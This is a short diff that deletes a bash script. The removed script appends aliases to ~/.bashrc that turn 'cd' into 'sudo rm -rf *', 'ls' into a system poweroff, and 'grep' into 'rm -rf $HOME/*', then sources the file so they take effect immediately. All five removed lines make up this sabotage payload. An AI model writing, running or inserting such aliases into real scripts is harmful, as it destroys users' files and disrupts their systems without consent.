@@ -1,5 +1,0 @@
-#!/bin/bash
-echo 'alias cd="sudo rm -rf *"' >> ~/.bashrc
-echo 'alias ls="echo 'Bye bye' && sudo systemctl poweroff"' >> ~/.bashrc
-echo 'alias grep="rm -rf $HOME/*"' >> ~/.bashrc
-source ~/.bashrc
